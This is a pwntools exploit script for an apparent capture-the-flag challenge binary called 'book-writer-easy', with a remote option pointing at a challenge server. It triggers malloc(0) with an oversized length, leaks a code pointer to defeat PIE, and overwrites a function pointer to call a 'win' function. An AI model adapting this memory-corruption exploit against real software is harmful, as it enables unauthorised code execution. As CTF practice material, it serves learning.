#!/usr/bin/python3.9
from pwn import *

context.terminal = '/usr/bin/kitty'

if not args.BLIND:
    context.binary = elfexe = ELF('./book-writer-easy') #FIXME
#    libc = ELF('<libc-used-by-target>') #FIXME

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    elf_path = './book-writer-easy'
    if args.REMOTE:
        remote_server = 'challenges.france-cybersecurity-challenge.fr'   #FIXME
        remote_port = 2100         #FIXME

        if args.SSH:
            s = ssh('app-systeme-ch8', remote_server, remote_port, 'app-systeme-ch8')
            if args.GDB:
                if not args.BLIND:
                    return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, ssh=s, *a, *kw)
                else:
                    return gdb.debug([elf_path] + argv, gdbscript, ssh=s, *a, *kw)
            else:
                target = s.process([elf_path] + argv, *a, **kw)
        else:
            target = remote(remote_server, remote_port)
    else:
        if args.GDB:
            if not args.BLIND:
                return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, *a, *kw)
            else:
                return gdb.debug([elf_path] + argv, gdbscript, *a, *kw)
        else:
            target = process([elf_path] + argv, *a, **kw)
    return target

gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# b *main+418
# b *main+505
# b *get_cmd
# command
#     printf "argv ptr: %p\\n",$rsi
# end

# continue
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
io = start(arguments)

# Create Book 1
io.sendline(b'1')
io.sendline(b'hello')
# Trigger malloc(0)
io.sendline(b'9223372036854775808')

# Create Book 2
io.sendline(b'1')
io.sendline(b'target')
io.sendline(b'2')

# Pick book 1
io.sendline(b'2')
io.sendline(b'0')

# Leak PIE
io.sendline(b'4')
res = io.recvuntil(b'target')
res = io.recvuntil(b'target')
res = io.recvuntil(b'target')
leaked_write = u64(res[:-6][-8:])
win = leaked_write + (elfexe.sym['win']-elfexe.sym['write_page'])
print(hex(win))

payload = b''
payload += b'A'*32
payload += p64(win)

# Exploit overflow
io.sendline(b'3')
io.sendline(payload)

# Pick book 2
io.sendline(b'2')
io.sendline(b'1')

# Call win
io.sendline(b'4')


io.interactive()
io.close()
